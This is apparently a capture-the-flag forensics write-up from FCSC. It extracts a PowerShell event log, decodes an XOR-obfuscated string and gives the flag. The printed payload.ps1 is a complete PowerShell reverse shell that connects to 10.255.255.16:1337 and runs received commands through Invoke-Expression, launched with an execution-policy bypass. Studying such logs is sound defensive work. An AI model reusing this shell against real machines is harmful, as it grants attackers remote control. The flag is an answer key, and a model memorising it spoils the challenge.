# Intro / La gazette de Windows

## Challenge
Il semblerait qu'un utilisateur exécute des scripts Powershell suspects sur sa machine. Heureusement cette machine est journalisée et nous avons pu récupérer le journal d'évènements Powershell. Retrouvez ce qui a été envoyé à l'attaquant.

## Inputs
- Microsoft Powershell log:  [Microsoft-Windows-PowerShell4Operational.evtx](./Microsoft-Windows-PowerShell4Operational.evtx)


## Solution
Let's use this tool https://github.com/williballenthin/python-evtx to extract the data from the log:
```console
$ python3 evtx_dump.py Microsoft-Windows-PowerShell4Operational.evtx > log.xml
```

Looking for PowerSheel scripts in this, we get some hints:
```console
$ grep -i ps1 log.xml
<Data Name="ScriptBlockText">if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; &amp; 'C:\Users\jmichel\Downloads\payload.ps1'</Data>
<Data Name="Path">C:\Users\jmichel\Downloads\payload.ps1</Data>
<Data Name="Path">C:\Users\jmichel\Downloads\payload.ps1</Data>
<Data Name="Path">C:\Users\jmichel\Downloads\payload.ps1</Data>
```

Here is the contents of `payload.ps1`:
```
<EventData><Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">do {
    Start-Sleep -Seconds 1
     try{
        $TCPClient = New-Object Net.Sockets.TCPClient('10.255.255.16', 1337)
    } catch {}
} until ($TCPClient.Connected)
$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
    $StreamWriter.Write($String + 'SHELL&gt; ')
    $StreamWriter.Flush()
}
$l = 0x46, 0x42, 0x51, 0x40, 0x7F, 0x3C, 0x3E, 0x64, 0x31, 0x31, 0x6E, 0x32, 0x34, 0x68, 0x3B, 0x6E, 0x25, 0x25, 0x24, 0x77, 0x77, 0x73, 0x20, 0x75, 0x29, 0x7C, 0x7B, 0x2D, 0x79, 0x29, 0x29, 0x29, 0x10, 0x13, 0x1B, 0x14, 0x16, 0x40, 0x47, 0x16, 0x4B, 0x4C, 0x13, 0x4A, 0x48, 0x1A, 0x1C, 0x19, 0x2, 0x5, 0x4, 0x7, 0x2, 0x5, 0x2, 0x0, 0xD, 0xA, 0x59, 0xF, 0x5A, 0xA, 0x7, 0x5D, 0x73, 0x20, 0x20, 0x27, 0x77, 0x38, 0x4B, 0x4D
$s = ""
for ($i = 0; $i -lt 72; $i++) {
    $s += [char]([int]$l[$i] -bxor $i)
}
WriteToStream $s
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    $Output = try {
            Invoke-Expression $Command 2&gt;&amp;1 | Out-String
        } catch {
            $_ | Out-String
        }
    WriteToStream ($Output)
}
$StreamWriter.Close()</Data>
<Data Name="ScriptBlockId">634cf5ca-b06b-4b5a-8354-c5ccd9d3c82a</Data>
<Data Name="Path">C:\Users\jmichel\Downloads\payload.ps1</Data>
</EventData>
```

Let's save the piece that builds the payload in `sol.ps1` and add a PowerShell `Write-Output` command to dump the payload:
```powershell
$l = 0x46, 0x42, 0x51, 0x40, 0x7F, 0x3C, 0x3E, 0x64, 0x31, 0x31, 0x6E, 0x32, 0x34, 0x68, 0x3B, 0x6E, 0x25, 0x25, 0x24, 0x77, 0x77, 0x73, 0x20, 0x75, 0x29, 0x7C, 0x7B, 0x2D, 0x79, 0x29, 0x29, 0x29, 0x10, 0x13, 0x1B, 0x14, 0x16, 0x40, 0x47, 0x16, 0x4B, 0x4C, 0x13, 0x4A, 0x48, 0x1A, 0x1C, 0x19, 0x2, 0x5, 0x4, 0x7, 0x2, 0x5, 0x2, 0x0, 0xD, 0xA, 0x59, 0xF, 0x5A, 0xA, 0x7, 0x5D, 0x73, 0x20, 0x20, 0x27, 0x77, 0x38, 0x4B, 0x4D
$s = ""
for ($i = 0; $i -lt 72; $i++) {
    $s += [char]([int]$l[$i] -bxor $i)
}
Write-Output $s
```

Now execute that PowerShell script with `pwsh`:
```console
$ pwsh sol.ps1
FCSC{98c98d98e5a546dcf6b1ea6e47602972ea1ce9ad7262464604753c4f79b3abd3}
```

## Python code
Complete solution in [sol.ps1](./sol.ps1)

## Flag
FCSC{98c98d98e5a546dcf6b1ea6e47602972ea1ce9ad7262464604753c4f79b3abd3}

